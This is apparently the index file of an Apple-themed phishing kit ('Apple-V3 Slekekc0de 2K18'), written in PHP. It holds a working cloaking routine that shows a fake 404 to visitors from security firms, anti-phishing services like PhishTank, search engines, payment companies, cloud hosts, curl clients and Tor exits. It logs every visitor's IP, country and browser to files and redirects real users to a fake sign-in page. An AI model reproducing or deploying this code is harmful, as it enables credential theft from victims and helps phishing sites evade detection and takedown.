<?php
//    _____                
//   /  _  \ _________  ___
//  /  /_\  \\____ \  \/  /
// /    |    \  |_> >    < 
// \____|__  /   __/__/\_ \
//         \/|__|        \/
// 			xlymetic 2017
// Apple-V3 Slekekc0de 2K18
// 
// ─── ── ── ── ── ── ── ── ── ─ 
// ─██ ██ ██ ██ ── ██ ██ ██ ██ ─ 
// ─██ ░░ ░░ ██ ── ██ ░░ ░░ ██ ─ 
// ─██ ██ ░░ ██ ── ██ ░░ ██ ██ ─ 
// ─── ██ ░░ ░░ ██ ░░ ░░ ██ ── ─ 
// ─── ██ ██ ░░ ░░ ░░ ██ ██ ── ─ 
// ─── ── ██ ██ ░░ ██ ██ ── ── ─ 
// ─── ── ── ██ ░░ ██ ── ── ── ─ 
// ─── ── ── ██ ░░ ██ ── ── ── ─ 
// ─── ── ── ██ ░░ ██ ── ── ── ─ 
// ─── ── ── ██ ░░ ██ ── ── ── ─ 
// ─── ── ── ██ ██ ██ ── ── ── ─ 
// ─── ── ── ── ── ── ── ── ── ─ 



error_reporting(0);
date_default_timezone_set('Europe/London');
require 'slekek/func.php';
require 'slekek/detectme.php';


$ua			= $_SERVER['HTTP_USER_AGENT'];
$tidee 		= date("l d F H:i:s");
$devtype 	= Detect::os()." -> ".Detect::browser();
$ip 		= Detect::ip();
$countryne 	= $_SESSION['negorone'] = Detect::ipCountry();
$hostnames 	= Detect::ipOrg();
$hostnames 	= strtolower($hostnames);
$blocked_words = array(
						"above",
						"level3",
						"level",
						"involta",
						"SOLUTIONPRO-NET",
						"SolutionPro",
						"SPRO-NET-206-80-96",
						"SPRO-NET-207-70-0",
						"SPRO-NET-209-19-128",
						"LVLT-STATIC-4-14-16",
						"americanexpress",
						"google",
						"softlayer",
						"amazonaws",
						"cyveillance",
						"phishtank",
						"dreamhost",
						"PycURL",
						"netpilot",
						"facebookexternalhit",
						"crawler",
						"java",
						"curl",
						"calyxinstitute",
						"tor-exit",
						"paypal" ,);

foreach($blocked_words as $word) {
	$word = strtolower($word);
	// echo "$word";
    if (substr_count($hostnames, $word) > 0) {
    	$fp = fopen("block.txt", "a");
		fputs($fp, "[$countryne] $ip | BROWSER: $ua\r\n");
		fclose($fp);
    	header("HTTP/1.0 404 Not Found");
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");

    }  
}

// Any computer device (desktops or laptops)
if (Detect::isComputer()) { 	// echo "isComputer";

	$fp = fopen("iplog.txt", "a");
	fputs($fp, "[$countryne] $ip | $tidee | BROWSER: $devtype\r\n");
	fclose($fp);
	$_SESSION['good_ea'] = true;
	$_SESSION['mobile'] = 0;
	redirectTo("./signin/#!&page=true&aid=".md5(date('ls')));

}

// Any mobile device (phone or tablets)
if (Detect::isMobile()) {		// echo "isMobile";

	$fp = fopen("iplog.txt", "a");
	fputs($fp, "[$countryne] $ip | $tidee | BROWSER: $devtype\r\n");
	fclose($fp);
	$_SESSION['good_ea'] = true;
	$_SESSION['mobile'] = 1;
	redirectTo("./signin/#!&page=true&aid=".md5(date('ls')));

}
